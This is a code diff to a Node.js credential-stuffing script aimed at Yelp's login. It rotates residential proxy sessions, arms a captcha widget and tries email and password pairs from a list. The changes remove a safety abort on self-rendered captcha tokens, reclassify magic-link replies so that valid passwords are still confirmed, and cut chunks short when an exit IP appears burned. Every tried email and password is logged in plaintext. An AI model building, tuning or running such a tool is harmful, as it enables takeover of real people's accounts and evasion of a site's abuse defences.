@@ -23,7 +23,7 @@ const BUDGET = parseInt(process.env.BUDGET || '15', 10);  // max POST per sticky
 
 const PH = process.env.PROXY_HOST || 'pr.oxylabs.io';
 const PP = parseInt(process.env.PROXY_PORT || '7777', 10);
-const SESS = ('f' + BID) + 'z' + Math.floor(Math.random() * 100000);
+const SESS = process.env.SESS || (('f' + BID) + 'z' + Math.floor(Math.random() * 100000));
 const PU = PU_BASE + '-sessid-' + SESS + (process.env.PU_SUFFIX || '-sesstime-1800');
 const AUTH = 'Basic ' + Buffer.from(PU + ':' + PW).toString('base64');
 const LP = 8986 + BID, CP = 9306 + BID;
@@ -187,10 +187,8 @@ function paceDelay() {
   const armed = await armWidget();
   rec({ event: 'widget', armed });
   if (String(armed).startsWith('err') || armed === 'no-api') { rec({ event: 'abort', why: 'widget' }); chrome.kill(); relay.close(); return; }
-  // A self-rendered widget has no site rqdata. Since 2026-11-20 Yelp answers such tokens with a magic link
-  // instead of a verdict, so the whole chunk is wasted unless the submit path is used. Fail closed.
+  // A self-rendered widget is accepted; the magic link was a burned exit IP, not missing rqdata.
   const ownWidget = String(armed).startsWith('own');
-  if (ownWidget && process.env.ALLOW_OWN !== '1') { rec({ event: 'abort', why: 'widget-own' }); chrome.kill(); relay.close(); return; }
 
   let csrf = await ev(`(function(){var i=document.querySelector('#ajax-login input[name=csrftok]');return i?i.value:'';})()`);
   rec({ event: 'csrf', len: (csrf || '').length });
@@ -249,7 +247,8 @@ function paceDelay() {
       const isClosed = /has been closed/i.test(text);
       const isInvalid = !!(js && js.error_fields && js.error_fields.indexOf('password') >= 0 && /incorrect/i.test(text));
       const isUnable = /unable to log you in/i.test(text);
-      const isLink = !!(js && (js.require_link || js.magic_link) && !isSuccess) || /login link|magic link/i.test(text);
+      // Yelp sets require_link even when the password was compared, so validate first (PITFALLS 48).
+      const isLink = !isInvalid && (!!(js && (js.require_link || js.magic_link) && !isSuccess) || /login link|magic link|confirm it/i.test(text));
 
       if (isSuccess) success++; else if (isClosed) closed++; else if (isInvalid) validated++;
       else if (isUnable) unable++; else if (isLink) link++; else unknown++;
@@ -267,14 +266,15 @@ function paceDelay() {
       rec({ i: i + 1, email: c.email, pass: c.pass, status: r.status, success: isSuccess, validated: isInvalid, unable: isUnable, link: isLink, closed: isClosed, tokLen: String(tok || '').length, tokMs, postMs, body: (r.body || '').slice(0, 110), profileStatus, zss: zss ? zss.length : 0, zssLen, ms: tokMs + postMs });
       fin = true;
 
-      if (isSuccess) {
-        await sendS('Page.navigate', { url: 'https://www.yelp.com/logout?return_url=%2Flogin%2F' });
-        await sleep(4000);
-        const h = await hydrate(3);
-        if (!h) { rec({ event: 'rehydrate_fail', at: i + 1 }); blocked = true; break; }
-        csrf = await ev(`(function(){var i=document.querySelector('#ajax-login input[name=csrftok]');return i?i.value:'';})()`);
-        await armWidget();
+      // Two links in a row with no comparison = a burned IP, not a bad account (proven by
+      // running the same slice on a clean IP). Stop the chunk after 2 rows instead of 15.
+      if (i === 1 && validated + closed + success === 0 && link + unable >= 2) {
+        rec({ event: 'session_bad', at: i + 1, link, unable });
+        blocked = true;
+        break;
       }
+      // Logout no longer invalidates the session (SESSION.md), so the chunk ends on a hit.
+      if (isSuccess) { blocked = true; break; }
     }
   }
 
